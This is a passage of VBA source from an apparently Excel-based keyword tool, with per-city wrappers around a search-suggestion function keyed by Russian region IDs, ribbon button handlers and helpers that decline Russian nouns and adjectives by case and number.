YSgSochi = getSugYa(x, 239)
End Function
Function YSgRostovOnDon(x As String) As String
YSgRostovOnDon = getSugYa(x, 39)
End Function
Function YSgNovocherkassk(x As String) As String
YSgNovocherkassk = getSugYa(x, 238)
End Function
Function YSgKirov(x As String) As String
YSgKirov = getSugYa(x, 46)
End Function
Function YSgYoshkarOla(x As String) As String
YSgYoshkarOla = getSugYa(x, 41)
End Function
Function YSgNN(x As String) As String
YSgNN = getSugYa(x, 47)
End Function
Function YSgOrenburg(x As String) As String
YSgOrenburg = getSugYa(x, 48)
End Function
Function YSgPenza(x As String) As String
YSgPenza = getSugYa(x, 49)
End Function
Function YSgPerm(x As String) As String
YSgPerm = getSugYa(x, 50)
End Function
Function YSgUfa(x As String) As String
YSgUfa = getSugYa(x, 172)
End Function
Function YSgSaransk(x As String) As String
YSgSaransk = getSugYa(x, 42)
End Function
Function YSgKazan(x As String) As String
YSgKazan = getSugYa(x, 43)
End Function
Function YSgNaberezhnyeChelny(x As String) As String
YSgNaberezhnyeChelny = getSugYa(x, 236)
End Function
Function YSgSamara(x As String) As String
YSgSamara = getSugYa(x, 51)
End Function
Function YSgTolyatti(x As String) As String
YSgTolyatti = getSugYa(x, 240)
End Function
Function YSgSaratov(x As String) As String
YSgSaratov = getSugYa(x, 194)
End Function
Function YSgIzhevsk(x As String) As String
YSgIzhevsk = getSugYa(x, 44)
End Function
Function YSgUlyanovsk(x As String) As String
YSgUlyanovsk = getSugYa(x, 195)
End Function
Function YSgCHeboksary(x As String) As String
YSgCHeboksary = getSugYa(x, 45)
End Function
Function YSgKurgan(x As String) As String
YSgKurgan = getSugYa(x, 53)
End Function
Function YSgTyumen(x As String) As String
YSgTyumen = getSugYa(x, 55)
End Function
Function YSgKHantyMansiysk(x As String) As String
YSgKHantyMansiysk = getSugYa(x, 57)
End Function
Function YSgCHelyabinsk(x As String) As String
YSgCHelyabinsk = getSugYa(x, 56)
End Function
Function YSgMagnitogorsk(x As String) As String
YSgMagnitogorsk = getSugYa(x, 235)
End Function
Function YSgSalekhard(x As String) As String
YSgSalekhard = getSugYa(x, 58)
End Function
Function YSgBarnaul(x As String) As String
YSgBarnaul = getSugYa(x, 197)
End Function
Function YSgIrkutsk(x As String) As String
YSgIrkutsk = getSugYa(x, 63)
End Function
Function YSgKemerovo(x As String) As String
YSgKemerovo = getSugYa(x, 64)
End Function
Function YSgNovokuznetsk(x As String) As String
YSgNovokuznetsk = getSugYa(x, 237)
End Function
Function YSgKrasnoyarsk(x As String) As String
YSgKrasnoyarsk = getSugYa(x, 62)
End Function
Function YSgNovosibirsk(x As String) As String
YSgNovosibirsk = getSugYa(x, 65)
End Function
Function YSgOmsk(x As String) As String
YSgOmsk = getSugYa(x, 66)
End Function
Function YSgUlanUde(x As String) As String
YSgUlanUde = getSugYa(x, 198)
End Function
Function YSgTomsk(x As String) As String
YSgTomsk = getSugYa(x, 67)
End Function
Function YSgCHita(x As String) As String
YSgCHita = getSugYa(x, 68)
End Function
Function YSgBlagoveschensk(x As String) As String
YSgBlagoveschensk = getSugYa(x, 77)
End Function
Function YSgPetropavlovskKamchatskiy(x As String) As String
YSgPetropavlovskKamchatskiy = getSugYa(x, 78)
End Function
Function YSgMagadan(x As String) As String
YSgMagadan = getSugYa(x, 79)
End Function
Function YSgVladivostok(x As String) As String
YSgVladivostok = getSugYa(x, 75)
End Function
Function YSgYAkutsk(x As String) As String
YSgYAkutsk = getSugYa(x, 74)
End Function
Function YSgYUzhnoSakhalinsk(x As String) As String
YSgYUzhnoSakhalinsk = getSugYa(x, 80)
End Function
Function YSgKHabarovsk(x As String) As String
YSgKHabarovsk = getSugYa(x, 76)
End Function
Function YSgMakhachkala(x As String) As String
YSgMakhachkala = getSugYa(x, 28)
End Function
Function YSgNalchik(x As String) As String
YSgNalchik = getSugYa(x, 30)
End Function
Function YSgVladikavkaz(x As String) As String
YSgVladikavkaz = getSugYa(x, 33)
End Function
Function YSgStavropol(x As String) As String
YSgStavropol = getSugYa(x, 36)
End Function
Sub SEM_SubYSgMSK(control As IRibbonControl)
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''<><><><><><><><><><
Call UDFArr2PL("getSugYa", 213)
End Sub
Function YSgMSK(x As String) As String
YSgMSK = getSugYa(x, 213)
End Function
Function YSgSPB(x As String) As String
YSgSPB = getSugYa(x, 2)
End Function
Function YSgEKB(x As String) As String
YSgEKB = getSugYa(x, 54)
End Function
Function YSgBelgorod(x As String) As String
YSgBelgorod = getSugYa(x, 4)
End Function
Function YSgBryansk(x As String) As String
YSgBryansk = getSugYa(x, 191)
End Function
Sub SEM_SubYSgSPB(control As IRibbonControl)
UDFArr ("YSgSPB")
End Sub
Sub SEM_SubYSgEKB(control As IRibbonControl)
UDFArr ("YSgEKB")
End Sub
Sub SEM_SubYSgBelgorod(control As IRibbonControl)
UDFArr ("YSgBelgorod")
End Sub
Sub SEM_SubYSgBryansk(control As IRibbonControl)
UDFArr ("YSgBryansk")
End Sub
Sub SEM_SubYSgVladimir(control As IRibbonControl)
UDFArr ("YSgVladimir")
End Sub
Sub SEM_SubYSgVoronezh(control As IRibbonControl)
UDFArr ("YSgVoronezh")
End Sub
Sub SEM_SubYSgIvanovo(control As IRibbonControl)
UDFArr ("YSgIvanovo")
End Sub
Sub SEM_SubYSgKaluga(control As IRibbonControl)
UDFArr ("YSgKaluga")
End Sub
Sub SEM_SubYSgKostroma(control As IRibbonControl)
UDFArr ("YSgKostroma")
End Sub
Sub SEM_SubYSgKursk(control As IRibbonControl)
UDFArr ("YSgKursk")
End Sub
Sub SEM_SubYSgLipetsk(control As IRibbonControl)
UDFArr ("YSgLipetsk")
End Sub
Sub SEM_SubYSgOrel(control As IRibbonControl)
UDFArr ("YSgOrel")
End Sub
Sub SEM_SubYSgRyazan(control As IRibbonControl)
UDFArr ("YSgRyazan")
End Sub
Sub SEM_SubYSgSmolensk(control As IRibbonControl)
UDFArr ("YSgSmolensk")
End Sub
Sub SEM_SubYSgTambov(control As IRibbonControl)
UDFArr ("YSgTambov")
End Sub
Sub SEM_SubYSgTver(control As IRibbonControl)
UDFArr ("YSgTver")
End Sub
Sub SEM_SubYSgTula(control As IRibbonControl)
UDFArr ("YSgTula")
End Sub
Sub SEM_SubYSgYAroslavl(control As IRibbonControl)
UDFArr ("YSgYAroslavl")
End Sub
Sub SEM_SubYSgArkhangelsk(control As IRibbonControl)
UDFArr ("YSgArkhangelsk")
End Sub
Sub SEM_SubYSgVologda(control As IRibbonControl)
UDFArr ("YSgVologda")
End Sub
Sub SEM_SubYSgKaliningrad(control As IRibbonControl)
UDFArr ("YSgKaliningrad")
End Sub
Sub SEM_SubYSgMurmansk(control As IRibbonControl)
UDFArr ("YSgMurmansk")
End Sub
Sub SEM_SubYSgVelikiyNovgorod(control As IRibbonControl)
UDFArr ("YSgVelikiyNovgorod")
End Sub
Sub SEM_SubYSgPskov(control As IRibbonControl)
UDFArr ("YSgPskov")
End Sub
Sub SEM_SubYSgPetrozavodsk(control As IRibbonControl)
UDFArr ("YSgPetrozavodsk")
End Sub
Sub SEM_SubYSgSyktyvkar(control As IRibbonControl)
UDFArr ("YSgSyktyvkar")
End Sub
Sub SEM_SubYSgAstrakhan(control As IRibbonControl)
UDFArr ("YSgAstrakhan")
End Sub
Sub SEM_SubYSgVolgograd(control As IRibbonControl)
UDFArr ("YSgVolgograd")
End Sub
Sub SEM_SubYSgKrasnodar(control As IRibbonControl)
UDFArr ("YSgKrasnodar")
End Sub
Sub SEM_SubYSgSochi(control As IRibbonControl)
UDFArr ("YSgSochi")
End Sub
Sub SEM_SubYSgRostovOnDon(control As IRibbonControl)
UDFArr ("YSgRostovOnDon")
End Sub
Sub SEM_SubYSgNovocherkassk(control As IRibbonControl)
UDFArr ("YSgNovocherkassk")
End Sub
Sub SEM_SubYSgKirov(control As IRibbonControl)
UDFArr ("YSgKirov")
End Sub
Sub SEM_SubYSgYoshkarOla(control As IRibbonControl)
UDFArr ("YSgYoshkarOla")
End Sub
Sub SEM_SubYSgNN(control As IRibbonControl)
UDFArr ("YSgNN")
End Sub
Sub SEM_SubYSgOrenburg(control As IRibbonControl)
UDFArr ("YSgOrenburg")
End Sub
Sub SEM_SubYSgPenza(control As IRibbonControl)
UDFArr ("YSgPenza")
End Sub
Sub SEM_SubYSgPerm(control As IRibbonControl)
UDFArr ("YSgPerm")
End Sub
Sub SEM_SubYSgUfa(control As IRibbonControl)
UDFArr ("YSgUfa")
End Sub
Sub SEM_SubYSgSaransk(control As IRibbonControl)
UDFArr ("YSgSaransk")
End Sub
Sub SEM_SubYSgKazan(control As IRibbonControl)
UDFArr ("YSgKazan")
End Sub
Sub SEM_SubYSgNaberezhnyeChelny(control As IRibbonControl)
UDFArr ("YSgNaberezhnyeChelny")
End Sub
Sub SEM_SubYSgSamara(control As IRibbonControl)
UDFArr ("YSgSamara")
End Sub
Sub SEM_SubYSgTolyatti(control As IRibbonControl)
UDFArr ("YSgTolyatti")
End Sub
Sub SEM_SubYSgSaratov(control As IRibbonControl)
UDFArr ("YSgSaratov")
End Sub
Sub SEM_SubYSgIzhevsk(control As IRibbonControl)
UDFArr ("YSgIzhevsk")
End Sub
Sub SEM_SubYSgUlyanovsk(control As IRibbonControl)
UDFArr ("YSgUlyanovsk")
End Sub
Sub SEM_SubYSgCHeboksary(control As IRibbonControl)
UDFArr ("YSgCHeboksary")
End Sub
Sub SEM_SubYSgKurgan(control As IRibbonControl)
UDFArr ("YSgKurgan")
End Sub
Sub SEM_SubYSgTyumen(control As IRibbonControl)
UDFArr ("YSgTyumen")
End Sub
Sub SEM_SubYSgKHantyMansiysk(control As IRibbonControl)
UDFArr ("YSgKHantyMansiysk")
End Sub
Sub SEM_SubYSgCHelyabinsk(control As IRibbonControl)
UDFArr ("YSgCHelyabinsk")
End Sub
Sub SEM_SubYSgMagnitogorsk(control As IRibbonControl)
UDFArr ("YSgMagnitogorsk")
End Sub
Sub SEM_SubYSgSalekhard(control As IRibbonControl)
UDFArr ("YSgSalekhard")
End Sub
Sub SEM_SubYSgBarnaul(control As IRibbonControl)
UDFArr ("YSgBarnaul")
End Sub
Sub SEM_SubYSgIrkutsk(control As IRibbonControl)
UDFArr ("YSgIrkutsk")
End Sub
Sub SEM_SubYSgKemerovo(control As IRibbonControl)
UDFArr ("YSgKemerovo")
End Sub
Sub SEM_SubYSgNovokuznetsk(control As IRibbonControl)
UDFArr ("YSgNovokuznetsk")
End Sub
Sub SEM_SubYSgKrasnoyarsk(control As IRibbonControl)
UDFArr ("YSgKrasnoyarsk")
End Sub
Sub SEM_SubYSgNovosibirsk(control As IRibbonControl)
UDFArr ("YSgNovosibirsk")
End Sub
Sub SEM_SubYSgOmsk(control As IRibbonControl)
UDFArr ("YSgOmsk")
End Sub
Sub SEM_SubYSgUlanUde(control As IRibbonControl)
UDFArr ("YSgUlanUde")
End Sub
Sub SEM_SubYSgTomsk(control As IRibbonControl)
UDFArr ("YSgTomsk")
End Sub
Sub SEM_SubYSgCHita(control As IRibbonControl)
UDFArr ("YSgCHita")
End Sub
Sub SEM_SubYSgBlagoveschensk(control As IRibbonControl)
UDFArr ("YSgBlagoveschensk")
End Sub
Sub SEM_SubYSgPetropavlovskKamchatskiy(control As IRibbonControl)
UDFArr ("YSgPetropavlovskKamchatskiy")
End Sub
Sub SEM_SubYSgMagadan(control As IRibbonControl)
UDFArr ("YSgMagadan")
End Sub
Sub SEM_SubYSgVladivostok(control As IRibbonControl)
UDFArr ("YSgVladivostok")
End Sub
Sub SEM_SubYSgYAkutsk(control As IRibbonControl)
UDFArr ("YSgYAkutsk")
End Sub
Sub SEM_SubYSgYUzhnoSakhalinsk(control As IRibbonControl)
UDFArr ("YSgYUzhnoSakhalinsk")
End Sub
Sub SEM_SubYSgKHabarovsk(control As IRibbonControl)
UDFArr ("YSgKHabarovsk")
End Sub
Sub SEM_SubYSgMakhachkala(control As IRibbonControl)
UDFArr ("YSgMakhachkala")
End Sub
Sub SEM_SubYSgNalchik(control As IRibbonControl)
UDFArr ("YSgNalchik")
End Sub
Sub SEM_SubYSgVladikavkaz(control As IRibbonControl)
UDFArr ("YSgVladikavkaz")
End Sub
Sub SEM_SubYSgStavropol(control As IRibbonControl)
UDFArr ("YSgStavropol")
End Sub
Sub SEM_arrSugYa(control As IRibbonControl)
arrSugYa
End Sub
Sub SEM_getSugYAtoArr(control As IRibbonControl)
getSugYAtoArrID
End Sub
Sub SEM_getSugYAtoArrMSK(control As IRibbonControl)
getSugYAtoArrID (213)
End Sub
Sub SEM_getSugYAtoArrBelgorod(control As IRibbonControl)
getSugYAtoArrID (4)
End Sub
Sub SEM_getSugYAtoArrBryansk(control As IRibbonControl)
getSugYAtoArrID (191)
End Sub
Sub SEM_getSugYAtoArrVladimir(control As IRibbonControl)
getSugYAtoArrID (192)
End Sub
Sub SEM_getSugYAtoArrVoronezh(control As IRibbonControl)
getSugYAtoArrID (193)
End Sub
Sub SEM_getSugYAtoArrIvanovo(control As IRibbonControl)
getSugYAtoArrID (5)
End Sub
Sub SEM_getSugYAtoArrKaluga(control As IRibbonControl)
getSugYAtoArrID (6)
End Sub
Sub SEM_getSugYAtoArrKostroma(control As IRibbonControl)
getSugYAtoArrID (7)
End Sub
Sub SEM_getSugYAtoArrKursk(control As IRibbonControl)
getSugYAtoArrID (8)
End Sub
Sub SEM_getSugYAtoArrLipetsk(control As IRibbonControl)
getSugYAtoArrID (9)
End Sub
Sub SEM_getSugYAtoArrOrel(control As IRibbonControl)
getSugYAtoArrID (10)
End Sub
Sub SEM_getSugYAtoArrRyazan(control As IRibbonControl)
getSugYAtoArrID (11)
End Sub
Sub SEM_getSugYAtoArrSmolensk(control As IRibbonControl)
getSugYAtoArrID (12)
End Sub
Sub SEM_getSugYAtoArrTambov(control As IRibbonControl)
getSugYAtoArrID (13)
End Sub
Sub SEM_getSugYAtoArrTver(control As IRibbonControl)
getSugYAtoArrID (14)
End Sub
Sub SEM_getSugYAtoArrTula(control As IRibbonControl)
getSugYAtoArrID (15)
End Sub
Sub SEM_getSugYAtoArrYAroslavl(control As IRibbonControl)
getSugYAtoArrID (16)
End Sub
Sub SEM_getSugYAtoArrSanktPeterburg(control As IRibbonControl)
getSugYAtoArrID (2)
End Sub
Sub SEM_getSugYAtoArrArkhangelsk(control As IRibbonControl)
getSugYAtoArrID (20)
End Sub
Sub SEM_getSugYAtoArrVologda(control As IRibbonControl)
getSugYAtoArrID (21)
End Sub
Sub SEM_getSugYAtoArrKaliningrad(control As IRibbonControl)
getSugYAtoArrID (22)
End Sub
Sub SEM_getSugYAtoArrMurmansk(control As IRibbonControl)
getSugYAtoArrID (23)
End Sub
Sub SEM_getSugYAtoArrVelikiyNovgorod(control As IRibbonControl)
getSugYAtoArrID (24)
End Sub
Sub SEM_getSugYAtoArrPskov(control As IRibbonControl)
getSugYAtoArrID (25)
End Sub
Sub SEM_getSugYAtoArrPetrozavodsk(control As IRibbonControl)
getSugYAtoArrID (18)
End Sub
Sub SEM_getSugYAtoArrSyktyvkar(control As IRibbonControl)
getSugYAtoArrID (19)
End Sub
Sub SEM_getSugYAtoArrAstrakhan(control As IRibbonControl)
getSugYAtoArrID (37)
End Sub
Sub SEM_getSugYAtoArrVolgograd(control As IRibbonControl)
getSugYAtoArrID (38)
End Sub
Sub SEM_getSugYAtoArrKrasnodar(control As IRibbonControl)
getSugYAtoArrID (35)
End Sub
Sub SEM_getSugYAtoArrSochi(control As IRibbonControl)
getSugYAtoArrID (239)
End Sub
Sub SEM_getSugYAtoArrRostovnaDonu(control As IRibbonControl)
getSugYAtoArrID (39)
End Sub
Sub SEM_getSugYAtoArrNovocherkassk(control As IRibbonControl)
getSugYAtoArrID (238)
End Sub
Sub SEM_getSugYAtoArrKirov(control As IRibbonControl)
getSugYAtoArrID (46)
End Sub
Sub SEM_getSugYAtoArrYoshkarOla(control As IRibbonControl)
getSugYAtoArrID (41)
End Sub
Sub SEM_getSugYAtoArrNizhniyNovgorod(control As IRibbonControl)
getSugYAtoArrID (47)
End Sub
Sub SEM_getSugYAtoArrOrenburg(control As IRibbonControl)
getSugYAtoArrID (48)
End Sub
Sub SEM_getSugYAtoArrPenza(control As IRibbonControl)
getSugYAtoArrID (49)
End Sub
Sub SEM_getSugYAtoArrPerm(control As IRibbonControl)
getSugYAtoArrID (50)
End Sub
Sub SEM_getSugYAtoArrUfa(control As IRibbonControl)
getSugYAtoArrID (172)
End Sub
Sub SEM_getSugYAtoArrSaransk(control As IRibbonControl)
getSugYAtoArrID (42)
End Sub
Sub SEM_getSugYAtoArrKazan(control As IRibbonControl)
getSugYAtoArrID (43)
End Sub
Sub SEM_getSugYAtoArrNaberezhnyeCHelny(control As IRibbonControl)
getSugYAtoArrID (236)
End Sub
Sub SEM_getSugYAtoArrSamara(control As IRibbonControl)
getSugYAtoArrID (51)
End Sub
Sub SEM_getSugYAtoArrTolyatti(control As IRibbonControl)
getSugYAtoArrID (240)
End Sub
Sub SEM_getSugYAtoArrSaratov(control As IRibbonControl)
getSugYAtoArrID (194)
End Sub
Sub SEM_getSugYAtoArrIzhevsk(control As IRibbonControl)
getSugYAtoArrID (44)
End Sub
Sub SEM_getSugYAtoArrUlyanovsk(control As IRibbonControl)
getSugYAtoArrID (195)
End Sub
Sub SEM_getSugYAtoArrCHeboksary(control As IRibbonControl)
getSugYAtoArrID (45)
End Sub
Sub SEM_getSugYAtoArrKurgan(control As IRibbonControl)
getSugYAtoArrID (53)
End Sub
Sub SEM_getSugYAtoArrEkaterinburg(control As IRibbonControl)
getSugYAtoArrID (54)
End Sub
Sub SEM_getSugYAtoArrTyumen(control As IRibbonControl)
getSugYAtoArrID (55)
End Sub
Sub SEM_getSugYAtoArrKHantyMansiysk(control As IRibbonControl)
getSugYAtoArrID (57)
End Sub
Sub SEM_getSugYAtoArrCHelyabinsk(control As IRibbonControl)
getSugYAtoArrID (56)
End Sub
Sub SEM_getSugYAtoArrMagnitogorsk(control As IRibbonControl)
getSugYAtoArrID (235)
End Sub
Sub SEM_getSugYAtoArrSalekhard(control As IRibbonControl)
getSugYAtoArrID (58)
End Sub
Sub SEM_getSugYAtoArrBarnaul(control As IRibbonControl)
getSugYAtoArrID (197)
End Sub
Sub SEM_getSugYAtoArrIrkutsk(control As IRibbonControl)
getSugYAtoArrID (63)
End Sub
Sub SEM_getSugYAtoArrKemerovo(control As IRibbonControl)
getSugYAtoArrID (64)
End Sub
Sub SEM_getSugYAtoArrNovokuznetsk(control As IRibbonControl)
getSugYAtoArrID (237)
End Sub
Sub SEM_getSugYAtoArrKrasnoyarsk(control As IRibbonControl)
getSugYAtoArrID (62)
End Sub
Sub SEM_getSugYAtoArrNovosibirsk(control As IRibbonControl)
getSugYAtoArrID (65)
End Sub
Sub SEM_getSugYAtoArrOmsk(control As IRibbonControl)
getSugYAtoArrID (66)
End Sub
Sub SEM_getSugYAtoArrUlanUde(control As IRibbonControl)
getSugYAtoArrID (198)
End Sub
Sub SEM_getSugYAtoArrTomsk(control As IRibbonControl)
getSugYAtoArrID (67)
End Sub
Sub SEM_getSugYAtoArrCHita(control As IRibbonControl)
getSugYAtoArrID (68)
End Sub
Sub SEM_getSugYAtoArrBlagoveschensk(control As IRibbonControl)
getSugYAtoArrID (77)
End Sub
Sub SEM_getSugYAtoArrPetropavlovskKamchatskiy(control As IRibbonControl)
getSugYAtoArrID (78)
End Sub
Sub SEM_getSugYAtoArrMagadan(control As IRibbonControl)
getSugYAtoArrID (79)
End Sub
Sub SEM_getSugYAtoArrVladivostok(control As IRibbonControl)
getSugYAtoArrID (75)
End Sub
Sub SEM_getSugYAtoArrYAkutsk(control As IRibbonControl)
getSugYAtoArrID (74)
End Sub
Sub SEM_getSugYAtoArrYUzhnoSakhalinsk(control As IRibbonControl)
getSugYAtoArrID (80)
End Sub
Sub SEM_getSugYAtoArrKHabarovsk(control As IRibbonControl)
getSugYAtoArrID (76)
End Sub
Sub SEM_getSugYAtoArrMakhachkala(control As IRibbonControl)
getSugYAtoArrID (28)
End Sub
Sub SEM_getSugYAtoArrNalchik(control As IRibbonControl)
getSugYAtoArrID (30)
End Sub
Sub SEM_getSugYAtoArrVladikavkaz(control As IRibbonControl)
getSugYAtoArrID (33)
End Sub
Sub SEM_getSugYAtoArrStavropol(control As IRibbonControl)
getSugYAtoArrID (36)
End Sub
'morphology
Private Function suf(x As String) As String
suf = Right(x, 3)
End Function
Private Function root(x As String) As String
root = Left(x, Len(x) - Len(suf(x)))
End Function
'NOUNS
Private Function roditEdW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then roditEdW = binSearch(x, abc.Range("nounExclusions2"), 2) Else roditEdW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 2)
End Function
Private Function datEdW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then datEdW = binSearch(x, abc.Range("nounExclusions2"), 3) Else datEdW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 3)
End Function
Private Function vinitEdW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then vinitEdW = binSearch(x, abc.Range("nounExclusions2"), 4) Else vinitEdW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 4)
End Function
Private Function tvoritEdW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then tvoritEdW = binSearch(x, abc.Range("nounExclusions2"), 5) Else tvoritEdW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 5)
End Function
Private Function predlEdW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then predlEdW = binSearch(x, abc.Range("nounExclusions2"), 6) Else predlEdW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 6)
End Function
Private Function MnozhW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then MnozhW = binSearch(x, abc.Range("nounExclusions2"), 7) Else MnozhW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 7)
End Function
Private Function roditMnW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then roditMnW = binSearch(x, abc.Range("nounExclusions2"), 8) Else roditMnW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 8)
End Function
Private Function datMnW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then datMnW = binSearch(x, abc.Range("nounExclusions2"), 9) Else datMnW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 9)
End Function
Private Function vinitMnW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then vinitMnW = binSearch(x, abc.Range("nounExclusions2"), 10) Else vinitMnW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 10)
End Function
Private Function tvoritMnW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then tvoritMnW = binSearch(x, abc.Range("nounExclusions2"), 11) Else tvoritMnW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 11)
End Function
Private Function predlMnW(x As String) As String
If binSearchB(x, abc.Range("nounExclusions")) Then predlMnW = binSearch(x, abc.Range("nounExclusions2"), 12) Else predlMnW = root(x) & binSearch(suf(x), abc.Range("nounSuffixes"), 12)
End Function
Function roditEdNoun(x As String) As String
roditEdNoun = exOnWords("roditEdW", x)
End Function
Function datEdNoun(x As String) As String
datEdNoun = exOnWords("datEdW", x)
End Function
Function vinitEdNoun(x As String) As String
vinitEdNoun = exOnWords("vinitEdW", x)
End Function
Function tvoritEdNoun(x As String) As String
tvoritEdNoun = exOnWords("tvoritEdW", x)
End Function
Function predlEdNoun(x As String) As String
predlEdNoun = exOnWords("predlEdW", x)
End Function
Function MnozhNoun(x As String) As String
MnozhNoun = exOnWords("MnozhW", x)
End Function
Function roditMnNoun(x As String) As String
roditMnNoun = exOnWords("roditMnW", x)
End Function
Function datMnNoun(x As String) As String
datMnNoun = exOnWords("datMnW", x)
End Function
Function vinitMnNoun(x As String) As String
vinitMnNoun = exOnWords("vinitMnW", x)
End Function
Function tvoritMnNoun(x As String) As String
tvoritMnNoun = exOnWords("tvoritMnW", x)
End Function
Function predlMnNoun(x As String) As String
predlMnNoun = exOnWords("predlMnW", x)
End Function
'ADJECTIVES
Private Function roditEd1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then roditEd1Adj = binSearch(x, abc.Range("adjExclusions2"), 2) Else roditEd1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 2)
End Function
Private Function datEd1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then datEd1Adj = binSearch(x, abc.Range("adjExclusions2"), 3) Else datEd1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 3)
End Function
Private Function vinitEd1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then vinitEd1Adj = binSearch(x, abc.Range("adjExclusions2"), 4) Else vinitEd1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 4)
End Function
Private Function tvoritEd1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then tvoritEd1Adj = binSearch(x, abc.Range("adjExclusions2"), 5) Else tvoritEd1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 5)
End Function
Private Function predlEd1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then predlEd1Adj = binSearch(x, abc.Range("adjExclusions2"), 6) Else predlEd1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 6)
End Function
Private Function Mnozh1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then Mnozh1Adj = binSearch(x, abc.Range("adjExclusions2"), 7) Else Mnozh1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 7)
End Function
Private Function roditMn1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then roditMn1Adj = binSearch(x, abc.Range("adjExclusions2"), 8) Else roditMn1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 8)
End Function
Private Function datMn1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then datMn1Adj = binSearch(x, abc.Range("adjExclusions2"), 9) Else datMn1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 9)
End Function
Private Function vinitMn1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then vinitMn1Adj = binSearch(x, abc.Range("adjExclusions2"), 10) Else vinitMn1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 10)
End Function
Private Function tvoritMn1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then tvoritMn1Adj = binSearch(x, abc.Range("adjExclusions2"), 11) Else tvoritMn1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 11)
End Function
Private Function predlMn1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then predlMn1Adj = binSearch(x, abc.Range("adjExclusions2"), 12) Else predlMn1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 12)
End Function
Private Function imFem1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then imFem1Adj = binSearch(x, abc.Range("adjExclusions2"), 13) Else imFem1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 13)
End Function
Private Function RDTPFem1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then RDTPFem1Adj = binSearch(x, abc.Range("adjExclusions2"), 14) Else RDTPFem1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 14)
End Function
Private Function vinFem1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then vinFem1Adj = binSearch(x, abc.Range("adjExclusions2"), 15) Else vinFem1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 15)
End Function
Private Function imNone1Adj(x As String) As String
If binSearchB(x, abc.Range("adjExclusions")) Then imNone1Adj = binSearch(x, abc.Range("adjExclusions2"), 16) Else imNone1Adj = root(x) & binSearch(suf(x), abc.Range("adjSuffixes"), 16)
End Function
Function roditEdAdj(x As String) As String
roditEdAdj = exOnWords("roditEd1Adj", x)
End Function
Function datEdAdj(x As String) As String
datEdAdj = exOnWords("datEd1Adj", x)
End Function
Function vinitEdAdj(x As String) As String
vinitEdAdj = exOnWords("vinitEd1Adj", x)
End Function
Function tvoritEdAdj(x As String) As String
tvoritEdAdj = exOnWords("tvoritEd1Adj", x)
End Function
Function predlEdAdj(x As String) As String
predlEdAdj = exOnWords("predlEd1Adj", x)
End Function
Function MnozhAdj(x As String) As String
MnozhAdj = exOnWords("Mnozh1Adj", x)
End Function
Function roditMnAdj(x As String) As String
roditMnAdj = exOnWords("roditMn1Adj", x)
End Function
Function datMnAdj(x As String) As String
datMnAdj = exOnWords("datMn1Adj", x)
End Function
Function vinitMnAdj(x As String) As String
vinitMnAdj = exOnWords("vinitMn1Adj", x)
End Function
Function tvoritMnAdj(x As String) As String
tvoritMnAdj = exOnWords("tvoritMn1Adj", x)
End Function
Function predlMnAdj(x As String) As String
predlMnAdj = exOnWords("predlMn1Adj", x)
End Function
Function imFemAdj(x As String) As String
imFemAdj = exOnWords("imFem1Adj", x)
End Function
Function RodFemAdj(x As String) As String
RodFemAdj = exOnWords("RDTPFem1Adj", x)
End Function
Function DatFemAdj(x As String) As String
DatFemAdj = exOnWords("RDTPFem1Adj", x)
End Function
Function tvoritFemAdj(x As String) As String
tvoritFemAdj = exOnWords("RDTPFem1Adj", x)
End Function
Function predlFemAdj(x As String) As String
predlFemAdj = exOnWords("RDTPFem1Adj", x)
End Function
Private Function RDTPFemAdj(x As String) As String
RDTPFemAdj = exOnWords("RDTPFem1Adj", x)
End Function
Function vinFemAdj(x As String) As String
